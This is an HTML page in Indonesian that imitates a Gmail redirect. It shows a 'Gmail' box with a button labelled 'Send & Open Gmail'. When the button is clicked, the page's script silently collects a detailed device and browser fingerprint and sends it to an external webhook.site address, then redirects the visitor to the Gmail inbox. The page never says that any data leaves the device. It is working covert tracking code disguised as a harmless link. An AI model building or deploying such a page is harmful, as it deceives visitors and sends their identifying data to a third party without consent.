<!DOCTYPE html>
<html lang="id">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Gmail Redirect GET</title>

<style>

body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f1f3f4;
    font-family:Arial,sans-serif;
}

.box{
    background:white;
    padding:35px;
    border-radius:15px;
    width:90%;
    max-width:400px;
    text-align:center;
    box-shadow:0 8px 25px rgba(0,0,0,.15);
}

button{
    width:100%;
    padding:15px;
    border:0;
    border-radius:10px;
    background:#1a73e8;
    color:white;
    font-size:17px;
    cursor:pointer;
}

button:disabled{
    background:#888;
}

#status{
    margin-top:15px;
}

</style>

</head>


<body>


<div class="box">

<h2>Gmail</h2>

<p>Klik tombol untuk lanjut</p>

<button id="btn">
Kirim & Buka Gmail
</button>

<div id="status">
Menunggu...
</div>

</div>



<script>


const WEBHOOK_URL =
"https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";



function collectData(){


const nav=navigator;

const conn =
nav.connection ||
nav.mozConnection ||
nav.webkitConnection;


return {

event:
"gmail_redirect_get",

time:
new Date().toISOString(),


page_url:
location.href,

page_title:
document.title,

referrer:
document.referrer || "",


user_agent:
nav.userAgent,

language:
nav.language,

languages:
(nav.languages || []).join(","),

platform:
nav.platform,

vendor:
nav.vendor,

online:
nav.onLine,


cookie_enabled:
nav.cookieEnabled,


screen:
screen.width+"x"+screen.height,


available_screen:
screen.availWidth+"x"+screen.availHeight,


color_depth:
screen.colorDepth,


pixel_ratio:
devicePixelRatio,


window_size:
innerWidth+"x"+innerHeight,


cpu:
nav.hardwareConcurrency || "",


memory:
nav.deviceMemory || "",


touch:
("ontouchstart" in window),


touch_points:
nav.maxTouchPoints || 0,


timezone:
Intl.DateTimeFormat()
.resolvedOptions()
.timeZone,


local_time:
new Date().toString(),


network_type:
conn ? conn.effectiveType : "",


network_speed:
conn ? conn.downlink : "",


network_rtt:
conn ? conn.rtt : ""


};


}



document.getElementById("btn")
.onclick=function(){


this.disabled=true;


document.getElementById("status")
.innerHTML="Mengirim GET...";



const data=collectData();



const params =
new URLSearchParams(data);



const url =
WEBHOOK_URL +
"?" +
params.toString();



fetch(url)
.then(()=>{


document.getElementById("status")
.innerHTML=
"Berhasil. Membuka Gmail...";


setTimeout(()=>{


location.href=
"https://mail.google.com/mail/u/0/#inbox";


},1000);


})


.catch(()=>{


document.getElementById("status")
.innerHTML=
"Gagal. Membuka Gmail...";


setTimeout(()=>{


location.href=
"https://mail.google.com/mail/u/0/#inbox";


},1000);


});


};


</script>


</body>

</html>
